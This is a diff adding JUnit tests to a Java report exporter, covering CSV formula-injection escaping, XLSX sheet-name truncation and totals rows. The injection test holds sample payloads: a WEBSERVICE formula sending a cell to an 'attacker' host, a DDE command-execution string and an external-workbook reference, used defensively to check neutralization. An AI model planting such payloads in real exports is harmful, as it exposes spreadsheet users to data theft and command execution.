@@ -108,6 +108,63 @@ class ReportExporterTests {
                 .hasMessageContaining("async export");
     }
 
+    @Test
+    @DisplayName("CSV formula injection is neutralized — a leading =, +, -, @ or tab never rides verbatim")
+    void csvFormulaInjectionNeutralized() {
+        // quoted (it carries quotes/commas) — but the payload is still neutralized
+        assertThat(ReportExporter.csvCell("=WEBSERVICE(\"http://attacker/?\"&A1)"))
+                .startsWith("\"'=").doesNotStartWith("\"=");
+        assertThat(ReportExporter.csvCell("=cmd|'/c calc'!A1")).startsWith("'=");
+        assertThat(ReportExporter.csvCell("+SUM(A1:A9)")).startsWith("'+");
+        assertThat(ReportExporter.csvCell("-2+3|'cmd'")).startsWith("'-");
+        assertThat(ReportExporter.csvCell("@external([1]Book1!Sheet1!A1)")).startsWith("'@");
+        assertThat(ReportExporter.csvCell("\ttab-led")).startsWith("'\t");
+        // plain data — including interior operators and negatives mid-string — rides bare
+        assertThat(ReportExporter.csvCell("acme corp")).isEqualTo("acme corp");
+        assertThat(ReportExporter.csvCell("revenue = top")).isEqualTo("revenue = top");
+    }
+
+    @Test
+    @DisplayName("a report id longer than 31 characters still exports — POI caps sheet names")
+    void xlsxSheetNameCapsAt31() throws Exception {
+        ReportDefinition longId = DefinitionParser.parse("""
+                { "id": "accountsReceivableAgingByCustomerRegionQuarter", "entity": "Invoice",
+                  "groupBy": [ { "field": "customer" } ],
+                  "aggregates": [ { "op": "sum", "field": "amountOutstanding" } ] }
+                """, ReportDefinition.class);
+        byte[] xlsx = exporter.xlsx(run(), longId, Set.of(), Locale.US);
+        try (Workbook workbook = new XSSFWorkbook(new java.io.ByteArrayInputStream(xlsx))) {
+            assertThat(workbook.getSheetName(0)).hasSize(31);
+            assertThat(workbook.getSheetName(0))
+                    .isEqualTo("accountsReceivableAgingByCustom");
+        }
+    }
+
+    @Test
+    @DisplayName("an aggregate-only report's closing row keeps its value — TOTAL never clobbers column 0")
+    void aggregateOnlyTotalRowKeepsItsValue() {
+        Map<String, Object> row = new LinkedHashMap<>();
+        row.put("sum_amount_outstanding", new BigDecimal("350.75"));
+        Map<String, Object> totals = new LinkedHashMap<>();
+        totals.put("sum_amount_outstanding", new BigDecimal("350.75"));
+        Map<String, Object> run = new LinkedHashMap<>();
+        run.put("columns", List.of("sum_amount_outstanding"));
+        run.put("rows", List.of(row));
+        run.put("totals", totals);
+        String csv = new String(exporter.csv(run, Set.of("sum_amount_outstanding"), Locale.US),
+                java.nio.charset.StandardCharsets.UTF_8);
+        // the closing row carries the formatted total where a group report prints TOTAL
+        assertThat(csv).contains("$350.75\r\n$350.75");
+        assertThat(csv).doesNotContain("TOTAL");
+
+        // and a run with no totals (a group-by-only report) closes without a totals row
+        Map<String, Object> none = new LinkedHashMap<>(run);
+        none.put("totals", Map.of());
+        String without = new String(exporter.csv(none, Set.of(), Locale.US),
+                java.nio.charset.StandardCharsets.UTF_8);
+        assertThat(without.lines().count()).isEqualTo(2);   // header + the one body row
+    }
+
     /** Minimal RFC 4180 reader for the parity pin — the corpus is quote-safe here. */
     private static List<List<String>> parseCsv(String text) {
         return text.lines().map(line ->
